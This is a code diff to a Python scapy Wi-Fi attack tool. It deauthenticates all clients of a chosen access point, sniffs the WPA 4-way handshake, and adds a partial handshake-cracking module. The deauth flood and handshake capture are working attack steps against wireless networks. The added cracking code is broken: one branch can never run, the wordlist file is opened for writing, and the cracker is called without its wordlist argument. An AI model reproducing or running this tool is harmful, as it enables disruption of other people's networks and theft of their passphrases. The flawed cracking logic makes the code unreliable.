@@ -4,6 +4,7 @@ from scapy.all import *
 import sys
 import signal
 import os
+from pbkdf2 import PBKDF2
 
 #Gloabal variables and banner:
 ap_list = []
@@ -11,6 +12,8 @@ cli_list = []
 to_frames = []
 from_frames = []
 ap_list_temp = []
+temp_frames = []
+temp_cli_mac = None
 interface = ""
 captured_handshake = False
 DS_FLAG = 0b11
@@ -26,6 +29,9 @@ class AP:
         self.ssid = ssid
         self.channel = channel
         self.cipher = cipher
+        self.handshake = False
+        self.frames = []
+        self.client_mac = None
     def print_ap(self):
         print("MAC: " + TGREEN + self.mac + TWHITE +  " SSID: " + TGREEN + self.ssid + TWHITE + " CH: " + TGREEN + str(self.channel) + TWHITE + " CIPHER: " + TGREEN + self.cipher + TWHITE)
 
@@ -186,10 +192,12 @@ def network_sniffer():
 def deauth(ap):
     target_mac = "ff:ff:ff:ff:ff:ff" #Deauth All clients
     gateway_mac = ap.mac
-    # 802.11 frame
-    # addr1: destination MAC
-    # addr2: source MAC
-    # addr3: Access Point MAC
+    # Contructing the 802.11 frame:
+
+    #Params :
+        # addr1: destination MAC
+        # addr2: source MAC
+        # addr3: Access Point MAC
     dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
     # stack them up
     packet = RadioTap()/dot11/Dot11Deauth(reason=7)
@@ -207,9 +215,9 @@ def checkForWPAHandshake(p):
         DS = p.FCfield & DS_FLAG
         to_ds = p.FCfield & TO_DS != 0
         if to_ds:
-            client = p.addr2
+            client = p.addr2 #The client send EAPOL Frame
         else:
-            client = p.addr1
+            client = p.addr1 #The AP send EAPOL Frame
         if client not in cli_list:
             cli_list.append(client)
             print("New client identified : " + str(p.addr1) + "----HANDSHAKE--->" + str(p.addr2))
@@ -221,7 +229,6 @@ def checkForWPAHandshake(p):
             to_frames[idx] = to_frames[idx] + 1
         else:
             from_frames[idx] = from_frames[idx] + 1
-
         # See if we captured 4 way handshake
         if (to_frames[idx] >= 2) and (from_frames[idx] >=2):
             captured_handshake = True
@@ -240,8 +247,9 @@ def grab_handshake(ap):
     print("Switching to channel " + str(ap.channel))
     os.system("iw dev "+ interface + " set channel %d" % ap.channel)
     print("Sniffing " + ap.ssid + "...")
-    p = sniff(iface=interface, stop_filter=checkForWPAHandshake)
+    p = sniff(iface=interface, stop_filter=checkForWPAHandshake) #Sniff for handshake
     print("Handshake Grabbed!")
+    ap.handshake = True     # Save the fact that we have the handshake for this AP
 
 
 
@@ -270,6 +278,75 @@ def handshake_grabber():
                 print("Bad input")
         if valid == True:
             grab_handshake(ap_list[choice])
+
+#####################################
+#       CRACKING FUNCTIONS          #
+#####################################
+def crack_handshake(ap,wordlist):
+
+    #First I need to bind 802.1X each field
+    for i in range (0,3):
+        packet = ap.frames[i]
+        payload = packet[30:-4]
+        eapol_frame = payload[4:]
+        version = eapol_frame[0]
+        eapol_frame_type = eapol_frame[1]
+        body_length = eapol_frame[2:4]
+        key_type = eapol_frame[4]
+        key_info = eapol_frame[5:7]
+        key_length = eapol_frame[7:9]
+        replay_counter = eapol_frame[9:17]
+        nonce = eapol_frame[17:49]
+        key_iv = eapol_frame[49:65]
+        key_rsc = eapol_frame[65:73]
+        key_id = eapol_frame[73:81]
+        mic = eapol_frame[81:97]
+        wpa_key_length = eapol_frame[97:99]
+        wpa_key = eapol_frame[99:]
+
+        #I also need to isolate the nonces
+        if i == 0:
+            ap_nonce = nonce
+        elif i == 1:
+            cl_nonce = nonce
+        elif i == 2:
+            continue
+        else:
+            eapol_frame_zeroed_mic = b''.join([
+                                eapol_frame[:81],
+                                b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0',
+                                eapol_frame[97:99]
+                            ])
+
+    dico = open(wordlist, 'w')
+    print("Cracking Handshake...")
+
+
+
+
+def handshake_cracker():
+    i = 0
+    if len(ap_list) == 0:
+        print("There is no access point sniffed yet, please start the network sniffer first.")
+        return
+    print("Please select the AP handshake you want to crack:")
+    for ap in ap_list:
+        if ap.handshake == True:
+            print("["+ TGREEN + str(i) + TWHITE + "] ",end="")
+            ap.print_ap()
+    valid = False
+    choice = None
+    while valid == False:
+        try:
+            choice = int(input('Target>'))
+            valid = True
+            if len(ap_list) < choice or choice < 0:
+                valid = False
+        except:
+            print("Bad input")
+    if valid == True:
+        crack_handshake(ap_list[choice])
+
 
 
 #Main menu funtion : The user can choose the module he want to execute.
